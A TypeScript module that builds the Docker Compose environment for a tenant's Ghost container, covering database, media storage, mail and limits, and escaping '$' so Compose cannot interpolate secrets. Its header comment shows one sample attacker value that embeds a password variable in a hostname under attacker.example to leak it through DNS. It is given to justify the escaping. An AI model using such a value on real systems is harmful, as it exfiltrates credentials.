/**
 * The environment one tenant's Ghost container receives, split by where each
 * value is allowed to live — ported and extended from
 * `infra/tenant/environment.ts`: database and media become unions. SQLite
 * emits `database__client=sqlite3` plus `__connection__filename` and drops
 * host, port, user, password and ssl; local media drops every
 * `storage__S3Storage__*` key and both S3 secrets, and sets `storage__active`
 * from the descriptor's own safety posture rather than leaving it unset.
 *
 * Every secret-shaped value below is a `${VAR:?…}` reference into
 * `/etc/branchleft/<slug>.env` (a paying tenant) or nothing at all (a demo,
 * whose `sqlite`/`local` variants need no credential) — never a literal
 * value. `render()` never receives a real secret to begin with, so this
 * module cannot leak one even if it tried; the reference form is kept
 * anyway so the rendered Compose file is honest about what it needs
 * supplied out of band.
 *
 * **`$` is escaped as `$$` in every raw descriptor-sourced string value.**
 * Compose interpolates `$VAR`/`${VAR}` inside `environment:` values at
 * `docker compose config` / `up` time — nothing to do with this package's
 * own `yaml.ts`, which only serialises document text faithfully. A
 * validated-but-attacker-chosen value such as
 * `database.host: 'db.${GHOST_DB_PASSWORD}.attacker.example'` would
 * otherwise let Compose substitute a real secret into a value that leaves
 * the container in a DNS lookup. `required()`'s own `${VAR:?…}` output is
 * the one deliberate interpolation and is never escaped.
 */

import type { Slug } from './brand.js';
import type {
  DatabaseSpec,
  LimitsSpec,
  MediaSpec,
  SafetySpec,
  TenantDescriptor,
  TransportSpec,
} from './descriptor.js';
import { mediaBucketName, mediaPublicBaseUrl, validateMediaBucket } from './media.js';
import { databaseAndUserName, validateDatabaseIdentity } from './naming.js';
import type { UploadLimits } from './runtime.js';

/** Names of the secrets a rendered `mysql`/`s3` Compose file expects in the
 * process environment, i.e. the keys of `/etc/branchleft/<slug>.env`. A
 * `sqlite`/`local` tenant (every demo) never references any of these. */
export const SECRET_ENV_KEYS = {
  databasePassword: 'GHOST_DB_PASSWORD',
  s3AccessKeyId: 'GHOST_S3_ACCESS_KEY_ID',
  s3SecretAccessKey: 'GHOST_S3_SECRET_ACCESS_KEY',
  mailPassword: 'GHOST_MAIL_PASSWORD',
} as const;

const MULTIPART_UPLOAD_THRESHOLD_BYTES = 10485760; // 10 MiB
const MULTIPART_CHUNK_SIZE_BYTES = 5242880; // S3Storage's own floor
const STATIC_FILE_URL_PREFIX = 'content/images';

/**
 * The custom storage adapter LLD-7 makes the load-bearing byte choke point
 * for every upload, and LLD-1 §04 says local media "sets storage__active
 * to the adapter named by safety". **Not renderable today — measured, not
 * assumed.** The adapter is not yet shipped in the image, and Ghost
 * `require()`s whatever `storage__active` names during first-boot user
 * creation (`core/server/models/user.js`'s gravatar lookup), not lazily on
 * first upload: rendering this name against `ghost-platform:ci` crashes
 * Ghost with `IncorrectUsageError: Unable to find storage adapter
 * ScanningStorageAdapter` before it ever serves a request. Kept here,
 * unused, as the target value for whichever story ships the adapter;
 * `mediaEnvironment` below renders Ghost's own real built-in adapter
 * instead until then — see its own comment.
 */
export const SCANNING_STORAGE_ADAPTER = 'ScanningStorageAdapter';

/** Ghost's own compiled-in local image adapter — real, and what
 * `mediaEnvironment` renders for `local` media today. See
 * `SCANNING_STORAGE_ADAPTER`'s own comment for why that one is not used yet. */
const BUILTIN_LOCAL_STORAGE_ADAPTER = 'LocalImagesStorage';

/**
 * The image's own fail-closed boot guard (`docker-entrypoint.branchleft.sh`)
 * refuses `storage__active` unset *and* refuses any `Local*Storage` value
 * outright — both read as "silently non-durable media" on the guard's own
 * Cloud Run-era assumption. A demo host's local disk is not Cloud Run's
 * ephemeral instance disk, so that assumption does not hold for a demo, and
 * this is the guard's own documented, deliberate escape hatch: "local
 * development / the SQLite smoke test only". A demo is exactly that case.
 */
const ALLOW_LOCAL_STORAGE_ENV_VAR = 'BRANCHLEFT_ALLOW_LOCAL_STORAGE';

function required(name: keyof typeof SECRET_ENV_KEYS, secretsFilePath: string): string {
  return `\${${SECRET_ENV_KEYS[name]}:?set ${SECRET_ENV_KEYS[name]} in ${secretsFilePath}}`;
}

// Compose's own `${VAR}`/`$VAR` interpolation — see the module doc comment.
// `$$` is Compose's escape for a literal `$`.
function escapeComposeDollar(value: string): string {
  return value.replaceAll('$', '$$$$');
}

/** Applies `escapeComposeDollar` to every string value in a flat env
 * record, leaving numbers and booleans (never interpolated) untouched. */
function escapeEnvValues(
  env: Record<string, string | number | boolean>
): Record<string, string | number | boolean> {
  const escaped: Record<string, string | number | boolean> = {};
  for (const [key, value] of Object.entries(env)) {
    escaped[key] = typeof value === 'string' ? escapeComposeDollar(value) : value;
  }
  return escaped;
}

/**
 * `databaseAndUserName` re-derives the tenant's MySQL database and user
 * name from the slug rather than trusting `database.name`/`database.user`
 * — the same isolation control `media.ts` already applies to the bucket.
 * `validateDatabaseIdentity` throws first if a descriptor's values
 * disagree, so this function never silently substitutes one value for
 * another.
 */
function databaseEnvironment(
  slug: Slug,
  database: DatabaseSpec
): Record<string, string | number | boolean> {
  if (database.kind === 'sqlite') {
    return {
      database__client: 'sqlite3',
      database__connection__filename: database.path,
    };
  }
  validateDatabaseIdentity(slug, database);
  const name = databaseAndUserName(slug);
  return {
    database__client: 'mysql',
    database__connection__host: database.host,
    database__connection__port: database.port,
    database__connection__database: name,
    database__connection__user: name,
    // The password is never a parameter of this function — see the module
    // doc comment. `secretsFilePath` closes over it from the caller.
    database__connection__ssl__rejectUnauthorized: false,
  };
}

/** `true` if either safety axis is on — see `SCANNING_STORAGE_ADAPTER`'s
 * own comment. Both are `true` for every tenant today (`SafetySpec`'s own
 * doc comment), so this always resolves to the scanning adapter now; the
 * branch exists for the day either flag can be off. */
function isScanningRequired(safety: SafetySpec): boolean {
  return safety.near || safety.exact;
}

/**
 * `mediaBucketName`/`mediaPublicBaseUrl` re-derive the bucket and its public
 * URL from the slug rather than trusting `media.bucket` — the same
 * isolation control `media.ts` documents. `validateMediaBucket` throws
 * first if a descriptor's `bucket` disagrees, so this function never
 * silently substitutes one value for another.
 */
function mediaEnvironment(
  slug: Slug,
  media: MediaSpec,
  safety: SafetySpec
): Record<string, string | number | boolean> {
  if (media.kind === 'local') {
    // `validate()`'s own `checkSafety` already refuses any descriptor
    // whose `safety.near`/`safety.exact` are not both `true` — so for any
    // descriptor that reaches this function, `isScanningRequired(safety)`
    // is always `true` today, and the adapter that ought to run is
    // `SCANNING_STORAGE_ADAPTER`. It is not rendered — see that constant's
    // own comment, measured against the real image, for why not — but the
    // parameter and the read stay, so this function's signature does not
    // need to change again the day the adapter ships; only its return
    // value will.
    //
    // `storage__active` is explicit, never omitted: the image's boot guard
    // refuses to start Ghost at all when it is unset. `ALLOW_LOCAL_STORAGE_ENV_VAR`
    // is required alongside it, or the same guard refuses any `Local*Storage`
    // value too — see that constant's own comment.
    //
    // Nothing here names an env var for `resize` / `srcsets` — LLD-1 §03b's
    // `media` row and LLD-7 both place responsive-image generation behind
    // the storage adapter itself (`handleImageSizes` reads the original
    // through it), not behind a Ghost core env var, so wiring those two
    // flags belongs to whatever story builds or configures that adapter.
    void isScanningRequired(safety); // read now, acted on once the adapter ships
    return {
      storage__active: BUILTIN_LOCAL_STORAGE_ADAPTER,
      [ALLOW_LOCAL_STORAGE_ENV_VAR]: true,
    };
  }
  validateMediaBucket(slug, media);
  const bucket = mediaBucketName(slug);
  return {
    storage__active: 'S3Storage',
    storage__S3Storage__bucket: bucket,
    storage__S3Storage__region: media.region,
    storage__S3Storage__endpoint: media.endpoint,
    storage__S3Storage__forcePathStyle: true,
    // No `tenantPrefix`: Ghost stores keys unprefixed when it is absent,
    // which is what a bucket holding exactly one tenant's objects wants.
    storage__S3Storage__staticFileURLPrefix: STATIC_FILE_URL_PREFIX,
    storage__S3Storage__cdnUrl: mediaPublicBaseUrl(media.endpoint, slug),
    storage__S3Storage__multipartUploadThresholdBytes: MULTIPART_UPLOAD_THRESHOLD_BYTES,
    storage__S3Storage__multipartChunkSizeBytes: MULTIPART_CHUNK_SIZE_BYTES,
  };
}

/**
 * `transport` env wiring is deliberately narrow today. `smtp` renders the
 * three non-secret fields a caller supplies; the sending address is not one
 * of them — member mail is addressed through a Ghost *setting*
 * (`members_support_address`), not the `mail__from` env var. `queue` (the
 * platform's own local mail spool) renders no Ghost env var at all.
 * **Known gap, not this module's to close:** tenant-zero parity against
 * `infra/tenant/environment.ts` is short by `mail__from` and the three
 * `bulkEmail__mailgun__*` keys — `TransportSpec` carries no field for any
 * of them; the descriptor's sending identity needs one first. See
 * `test/parity.test.ts`, which asserts this gap explicitly (an exact,
 * named list of the missing keys) rather than silently passing.
 */
function transportEnvironment(transport: TransportSpec): Record<string, string | number | boolean> {
  if (transport.kind === 'queue') {
    return {};
  }
  return {
    mail__transport: 'SMTP',
    mail__options__host: transport.host,
    mail__options__port: transport.port,
    mail__options__secure: false,
    mail__options__auth__user: transport.user,
  };
}

/**
 * Ghost reads host limits only from `config.get('hostSettings:limits')`
 * (`ghost/core/core/server/services/limits.js`) — never from a setting the
 * Admin API can write, which is why these render as env, not as part of
 * `settings.ts`'s `ghost-settings.json`. `null` means "no cap": Ghost's own limits service reads
 * an absent/`false` `disabled`-less block as uncapped, so a `null` cap
 * renders no key for that axis at all, rather than a value Ghost would
 * have to parse as "no limit".
 */
function hostLimitsEnvironment(limits: LimitsSpec): Record<string, string | number | boolean> {
  const env: Record<string, string | number | boolean> = {};
  if (limits.membersCap !== null) {
    env.hostSettings__limits__members__max = limits.membersCap;
  }
  if (limits.staffCap !== null) {
    env.hostSettings__limits__staff__max = limits.staffCap;
  }
  return env;
}

/**
 * The `environment:` block of the rendered Compose service, for every kind.
 * `secretsFilePath` only appears inside a `${…:?}` reference's own failure
 * message — see `naming.ts#secretsEnvPath` for the value a caller supplies.
 */
export function tenantEnvironment(
  descriptor: Pick<
    TenantDescriptor,
    'slug' | 'siteUrl' | 'database' | 'media' | 'transport' | 'safety' | 'limits'
  >,
  limits: UploadLimits,
  secretsFilePath: string
): Record<string, string | number | boolean> {
  const env: Record<string, string | number | boolean> = {
    url: descriptor.siteUrl,
    ...databaseEnvironment(descriptor.slug, descriptor.database),
    ...mediaEnvironment(descriptor.slug, descriptor.media, descriptor.safety),
    ...transportEnvironment(descriptor.transport),
    ...hostLimitsEnvironment(descriptor.limits),

    security__allowWebhookInternalIPs: false,

    theme__uploadLimits__compressedBytes: limits.themeCompressedBytes,
    theme__uploadLimits__entryUncompressedBytes: limits.themeEntryUncompressedBytes,
    theme__uploadLimits__totalUncompressedBytes: limits.themeTotalUncompressedBytes,

    privacy__useUpdateCheck: false,
    logging__transports: '["stdout"]',
  };

  const escaped = escapeEnvValues(env);

  // Appended after escaping: `required()`'s own `${VAR:?…}` syntax is the
  // one deliberate interpolation in this document and must reach Compose
  // unescaped, or the reference itself would stop working.
  if (descriptor.database.kind === 'mysql') {
    escaped.database__connection__password = required('databasePassword', secretsFilePath);
  }
  if (descriptor.media.kind === 's3') {
    escaped.storage__S3Storage__accessKeyId = required('s3AccessKeyId', secretsFilePath);
    escaped.storage__S3Storage__secretAccessKey = required('s3SecretAccessKey', secretsFilePath);
  }
  if (descriptor.transport.kind === 'smtp') {
    escaped.mail__options__auth__pass = required('mailPassword', secretsFilePath);
  }

  return escaped;
}
